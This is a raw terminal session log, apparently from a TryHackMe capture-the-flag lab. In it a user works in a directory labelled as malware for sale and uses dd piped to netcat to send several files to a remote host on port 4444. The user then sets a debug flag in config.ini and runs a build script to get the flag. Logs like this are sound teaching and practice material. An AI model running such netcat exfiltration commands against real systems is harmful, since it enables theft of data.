+<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K[?2004h<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [7mdd if=config.ini status=progress | /tmp/nc 10.8.61.2[27m[7m4[27m[7m5 4444[27m[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hdd if=config.ini status=progress | /tmp/nc 10.8.61.245 4444
+[K<nfig.ini status=progress | /tmp/nc 10.8.61.245 4444
+0+1 records in
+0+1 records out
+12 bytes copied, 0.00237371 s, 5.1 kB/s
+[K<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K[?2004h<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [7mdd if=mmmbar.nim status=progress | /tmp/nc 10.8.61.2[27m[7m4[27m[7m5 4444[27m[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hdd if=mmmbar.nim status=progress | /tmp/nc 10.8.61.245 4444
+[K<mbar.nim status=progress | /tmp/nc 10.8.61.245 4444[K<mbar.nim status=progress | /tmp/nc 10.8.61.245 4444[K<mbar.nim status=progress | /tmp/nc 10.8.61.245 4444
+4+1 records in
+4+1 records out
+2397 bytes (2.4 kB, 2.3 KiB) copied, 0.00017774 s, 13.5 MB/s
+[K<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K[?2004h<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [7mdd if=readme.txt status=progress | /tmp/nc 10.8.61.2[27m[7m4[27m[7m5 4444[27m[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hdd if=readme.txt status=progress | /tmp/nc 10.8.61.245 4444
+[K<adme.txt status=progress | /tmp/nc 10.8.61.245 4444[K<adme.txt status=progress | /tmp/nc 10.8.61.245 4444[K<adme.txt status=progress | /tmp/nc 10.8.61.245 4444
+0+1 records in
+0+1 records out
+259 bytes copied, 0.000661683 s, 391 kB/s
+[K<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K[?2004h<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ cat config.ini[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat config.ini
+[Kcat config.ini[Kcat config.ini[Kcat config.ini
+debug=false
+<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K[?2004h<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [7msed -i 's/^debug=.*/debug=true/' config.ini[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsed -i 's/^debug=.*/debug=true/' config.ini
+[K<2DC6C0$ sed -i 's/^debug=.*/debug=true/' config.ini[K<2DC6C0$ sed -i 's/^debug=.*/debug=true/' config.ini[K<2DC6C0$ sed -i 's/^debug=.*/debug=true/' config.ini
+sed: couldn't open temporary file ./sedytqWqj: Permission denied
+<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K[?2004h<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ ls -l[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -l
+[Kls -l
+[Ktotal 16
+-rwxrwxr-x 1 root root  125 Apr  9  2024 build.sh
+-rw-rw-rw- 1 root root   12 Apr 10  2024 config.ini
+-rw-rw-r-- 1 root root 2397 Apr  9  2024 mmmbar.nim
+-rw-r--r-- 1 root root  259 Apr  9  2024 readme.txt
+<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K[?2004h<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ echo ""[Kdebug=true" > config.ini[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hecho "debug=true" > config.ini
+[K<isterMeist3r/2DC6C0$ echo "debug=true" > config.ini[K<isterMeist3r/2DC6C0$ echo "debug=true" > config.ini[K<isterMeist3r/2DC6C0$ echo "debug=true" > config.ini
+<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K[?2004h<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ cat config.ini[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat config.ini
+[Kcat config.ini[Kcat config.ini[Kcat config.ini
+debug=true
+<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K[?2004h<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ ./build.sh[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h./build.sh
+[K./build.sh[K./build.sh[K./build.sh
+Build done. THM{3FDbU2nNy2FW7yMvMoH6WTMMM}
+<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ [K[?2004h<ducts/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0$ exir[Kt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit[Kexit[Kexit
+exit
+$ [K$ [K[?2004h$ exit[C[C[?2004l[C[C[K[?2004hexit
+[K
+[?2004l
+Script done on 2025-03-19 20:44:38+03:00 [COMMAND_EXIT_CODE="1"]
